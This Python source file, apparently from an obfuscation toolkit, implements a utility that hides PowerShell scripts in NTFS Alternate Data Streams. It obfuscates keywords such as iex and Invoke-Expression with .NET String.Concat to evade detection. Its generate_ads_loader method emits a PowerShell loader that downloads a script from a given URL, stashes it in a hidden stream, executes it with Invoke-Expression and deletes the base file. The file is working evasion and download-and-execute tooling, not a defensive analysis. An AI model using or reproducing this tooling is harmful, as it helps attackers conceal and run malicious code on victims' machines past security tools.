"""
PowerShell Alternate Data Streams (ADS) utility.

Note: This is a utility rather than a transformer because it requires file system
operations rather than just in-memory code manipulation.
"""
import os
import random
import platform
import tempfile
import re
from typing import Optional, Tuple

from pyfuscator.core.utils import random_name
from pyfuscator.log_utils import logger

class AlternateDataStreams:
    """Utility for hiding PowerShell scripts in NTFS Alternate Data Streams."""
    
    def __init__(self, base_filename: Optional[str] = None):
        """
        Initialize the ADS utility.
        
        Args:
            base_filename: Optional base filename to use (if None, will create a temp file)
        """
        self.base_filename = base_filename
        self.stream_name = f"{random_name(8)}"
        self.is_windows = platform.system() == "Windows"
        
    def dotnet_concat_obfuscate(self, command: str) -> str:
        """
        Obfuscate a command using .NET String.Concat method.
        
        Args:
            command: Command to obfuscate
            
        Returns:
            Obfuscated command using .NET String.Concat
        """
        tokens = [f'"{ch}"' for ch in command]
        # Insert random spaces between tokens for additional obfuscation
        spaces = ' ' * random.randint(0, 3)
        obfuscated = f"[String]::Concat({spaces}" + f",{spaces} ".join(tokens) + f"{spaces})"
        return obfuscated
        
    def obfuscate_dotnet_commands(self, content: str) -> str:
        """
        Obfuscate key PowerShell commands using .NET methods.
        
        Args:
            content: PowerShell script content
            
        Returns:
            Content with obfuscated commands
        """
        # List of keywords to obfuscate in the script
        keywords = ["iex", "Invoke-Expression", "Invoke-Command", "icm"]
        
        # Randomly obfuscate some instances of each keyword
        for kw in keywords:
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b')
            
            # Find all instances of the keyword
            matches = list(pattern.finditer(content))
            
            # Obfuscate a random subset (50-90%) of the matches
            obfuscate_count = int(len(matches) * random.uniform(0.5, 0.9))
            matches_to_obfuscate = random.sample(matches, min(obfuscate_count, len(matches)))
            
            # Sort in reverse order to maintain string indices after replacements
            matches_to_obfuscate.sort(key=lambda m: m.start(), reverse=True)
            
            # Replace each selected match
            for match in matches_to_obfuscate:
                start, end = match.span()
                replacement = self.dotnet_concat_obfuscate(match.group(0))
                content = content[:start] + replacement + content[end:]
                
        return content
        
    def store_in_ads(self, script_path_or_content: str) -> Tuple[str, str]:
        """
        Store content in an Alternate Data Stream.
        
        Args:
            script_path_or_content: Path to PowerShell script file or script content
            
        Returns:
            Tuple containing (path to file with ADS, PowerShell script to access it)
        """
        # Determine if input is a path or content
        is_path = os.path.exists(script_path_or_content)
        
        if is_path:
            # It's a file path
            script_path = script_path_or_content
            try:
                with open(script_path, 'r', encoding='utf-8') as f:
                    content = f.read()
            except Exception as e:
                logger.error(f"Error reading script file: {e}")
                # Return a mock implementation if file can't be read
                return self._create_mock_ads(script_path_or_content)
        else:
            # It's content directly
            content = script_path_or_content
            # Create a temporary file to hold the content
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.ps1')
            script_path = temp_file.name
            temp_file.close()
            try:
                with open(script_path, 'w', encoding='utf-8') as f:
                    f.write(content)
            except Exception as e:
                logger.error(f"Error writing temporary file: {e}")
                # Return a mock implementation if file can't be written
                return self._create_mock_ads(content[:20] + "...")
        
        # Apply additional obfuscation to the content
        content = self.obfuscate_dotnet_commands(content)
        
        if not self.is_windows:
            return self._create_mock_ads(script_path, content)
            
        # On Windows, create the actual ADS
        temp_dir = tempfile.gettempdir()
        base_file = self.base_filename or os.path.join(temp_dir, f"{random_name(8)}.txt")
        stream_path = f"{base_file}:{self.stream_name}"
        
        # Create the base file if it doesn't exist
        if not os.path.exists(base_file):
            with open(base_file, "w", encoding="utf-8") as f:
                f.write("This file contains hidden data in an alternate data stream.")
        
        # Write content to the ADS
        try:
            with open(stream_path, "w", encoding="utf-8") as f:
                f.write(content)
            logger.info(f"Successfully stored script in ADS: {stream_path}")
        except Exception as e:
            logger.error(f"Failed to write to ADS: {e}")
            # Fall back to normal file
            return base_file, content
            
        # Create PowerShell script to access and execute content from ADS
        # Enhanced with .NET String.Concat for additional obfuscation
        extra_spaces = ' ' * random.randint(0, 3)
        access_script = f"""
{extra_spaces}# Get content from Alternate Data Stream and execute it
{extra_spaces}$streamContent = Get-Content -Path "{base_file}:{self.stream_name}" -Raw
{extra_spaces}$concat_command = [String]::Concat("i", "e", "x", " ", "$streamContent")
{extra_spaces}Invoke-Expression $concat_command
"""
        
        return base_file, access_script
        
    def _create_mock_ads(self, name_or_content, content=None) -> Tuple[str, str]:
        """
        Create a mock ADS implementation for non-Windows systems.
        
        Args:
            name_or_content: Name of the file or content to simulate storing
            content: Optional content if name_or_content is a file name
            
        Returns:
            Tuple containing (path to mock file, PowerShell script to simulate ADS)
        """
        temp_dir = tempfile.gettempdir()
        base_file = self.base_filename or os.path.join(temp_dir, f"{random_name(8)}.txt")
        stream_path = f"{base_file}:{self.stream_name}"
        
        if content is None:
            # Just use the first part as a sample
            if len(name_or_content) > 100:
                content_sample = name_or_content[:100] + "..."
            else:
                content_sample = name_or_content
        else:
            content_sample = content
            
        # Create a PowerShell script to simulate ADS access
        extra_spaces = ' ' * random.randint(0, 3)
        access_script = f"""
{extra_spaces}# This is a simulation of ADS access for non-Windows systems
{extra_spaces}$base_file = "{base_file}"
{extra_spaces}$stream_name = "{self.stream_name}"

{extra_spaces}# Write a message explaining ADS is Windows-only
{extra_spaces}Write-Host "Warning: Alternate Data Streams are only supported on Windows NTFS filesystem."
{extra_spaces}Write-Host "This is a simulated ADS implementation."
{extra_spaces}Write-Host "In a real Windows environment, the script would be hidden in: $base_file`:$stream_name"

{extra_spaces}# Execute the script content directly
{content_sample}
"""
        # Write the base file
        with open(base_file, "w") as f:
            f.write("This is a base file for ADS simulation.")
            
        return base_file, access_script
        
    def generate_ads_loader(self, url: str) -> str:
        """
        Generate a PowerShell script that downloads and executes content via ADS.
        
        Args:
            url: URL to download the script from
            
        Returns:
            PowerShell script that downloads, stores in ADS, and executes the content
        """
        temp_file = f"$env:TEMP\\{random_name(8)}.txt"
        stream_name = self.stream_name
        
        # Add random spaces to reduce entropy
        extra_spaces = ' ' * random.randint(0, 3)
        
        loader_script = f"""
{extra_spaces}# Download and execute content via Alternate Data Stream
{extra_spaces}$tempFile = "{temp_file}"
{extra_spaces}$streamName = "{stream_name}"

{extra_spaces}# Create the base file
{extra_spaces}Set-Content -Path $tempFile -Value "This file contains hidden data in an alternate data stream."

{extra_spaces}# Download content and store in ADS
{extra_spaces}$webContent = (New-Object System.Net.WebClient).DownloadString("{url}")
{extra_spaces}Set-Content -Path "$tempFile`:$streamName" -Value $webContent

{extra_spaces}# Execute content from ADS using .NET String.Concat for obfuscation
{extra_spaces}$streamContent = Get-Content -Path "$tempFile`:$streamName" -Raw
{extra_spaces}$concat_command = [String]::Concat("i", "e", "x", " ", "$streamContent")
{extra_spaces}Invoke-Expression $concat_command

{extra_spaces}# Clean up
{extra_spaces}Remove-Item -Path $tempFile -Force
"""
        
        return loader_script 